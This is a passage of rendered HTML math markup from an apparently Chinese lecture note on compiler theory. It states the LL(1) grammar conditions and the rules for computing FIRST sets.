class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9748em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel">→</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∗</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">ϵ</span></span></span></span></eq>时，仅有上述条件不够，需要达成LL(1)文法条件</li></ul></li></ul><h4 id="ll(1)%E6%96%87%E6%B3%95" tabindex="-1">LL(1)文法</h4><ul><li><p>定义：</p><ul><li>文法中任一形如<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>U</mi><mo>→</mo><msub><mi>α</mi><mn>1</mn></msub><mi mathvariant="normal">∣</mi><msub><mi>α</mi><mn>2</mn></msub><mi mathvariant="normal">∣</mi><mo>…</mo><mi mathvariant="normal">∣</mi><msub><mi>α</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">U→α_1|α_2|…|α_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>的产生式满足：<ul><li><ol><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>α</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>α</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><msub><mi>α</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">α_1, α_2, …, α_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>的终结首符号集两两互不相交，即<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><msub><mi>α</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>⋂</mo><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><msub><mi>α</mi><mi>j</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mi>ϕ</mi><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">!</mo><mo>=</mo><mi>j</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">FIRST(α_i)\bigcap FIRST(α_j)=\phi(i!=j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">RST</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-symbol small-op" style="position:relative;top:0em;">⋂</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">RST</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mclose">!</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">)</span></span></span></span></eq></li></ol></li><li><ol start="2"><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>j</mi></msub><msup><mo>→</mo><mo>∗</mo></msup><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">a_j\rightarrow^*\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9748em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel">→</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">ϵ</span></span></span></span></eq>文法还用是满足<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><msub><mi>α</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>⋂</mo><mi>F</mi><mi>O</mi><mi>L</mi><mi>L</mi><mi>O</mi><mi>W</mi><mo stretchy="false">(</mo><mi>U</mi><mo stretchy="false">)</mo><mo>=</mo><mi>ϕ</mi></mrow><annotation encoding="application/x-tex">FIRST(α_i)\bigcap FOLLOW(U)=\phi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">RST</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-symbol small-op" style="position:relative;top:0em;">⋂</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">FO</span><span class="mord mathnormal">LL</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">ϕ</span></span></span></span></eq></li></ol></li></ul></li></ul></li><li><p>计算FIRST集合</p><ul><li>若 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi><mo>=</mo><mi>X</mi><mo>∈</mo><mo stretchy="false">(</mo><msub><mi>V</mi><mi>U</mi></msub><mo>⋃</mo><msub><mi>V</mi><mi>T</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\alpha=X\in (V_U \bigcup V_T)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7224em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">U</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-symbol small-op" style="position:relative;top:0em;">⋃</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></eq>,<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">FIRST(X)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">RST</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span></span></span></span></eq>构造为<ul><li><ol><li>若<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>∈</mo><msub><mi>V</mi><mi>T</mi></msub></mrow><annotation encoding="application/x-tex">X\in V_T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7224em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>,则<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">{</mo><mi>X</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">FIRST(X)=\{X\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">RST</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">}</span></span></span></span></eq></li></ol></li><li><ol start="2"><li>若<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>∈</mo><msub><mi>V</mi><mi>N</mi></msub></mrow><annotation encoding="application/x-tex">X\in V_N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7224em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>,相应产生式为<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>→</mo><mi>a</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mi>a</mi><mo>∈</mo><msub><mi>V</mi><mi>T</mi></msub></mrow><annotation encoding="application/x-tex">X\rightarrow a...,a\in V_T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7335em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">a</span><span class="mord">...</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>,则<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo>∈</mo><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">a\in FIRST(X)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">RST</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span></span></span></span></eq>,若有相应产生式<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>→</mo><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">X\rightarrow \epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">ϵ</span></span></span></span></eq>，则 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϵ</mi><mo>∈</mo><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\epsilon \in FIRST(X)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">ϵ</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">RST</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span></span></span></span></eq></li></ol></li><li><ol start="3"><li>若<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>∈</mo><msub><mi>V</mi><mi>N</mi></msub></mrow><annotation encoding="application/x-tex">X\in V_N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7224em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>,相应产生式为<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>→</mo><mi>Y</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mi>Y</mi><mo>∈</mo><msub><mi>V</mi><mi>N</mi></msub></mrow><annotation encoding="application/x-tex">X \rightarrow Y..,Y\in V_N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mord">..</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>,则<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>−</mo><mo stretchy="false">{</mo><mi>ϵ</mi><mo stretchy="false">}</mo><mo>⊂</mo><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">FIRST(Y)-\{\epsilon\}\subset FIRST(X)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">RST</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathnormal">ϵ</span><span class="mclose">}</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⊂</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">RST</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span></span></span></span></eq><br>如果有产生式<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>→</mo><msub><mi>Y</mi><mn>1</mn></msub><msub><mi>Y</mi><mn>2</mn></msub><mo>…</mo><msub><mi>Y</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">X\rightarrow Y_1Y_2…Y_k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span 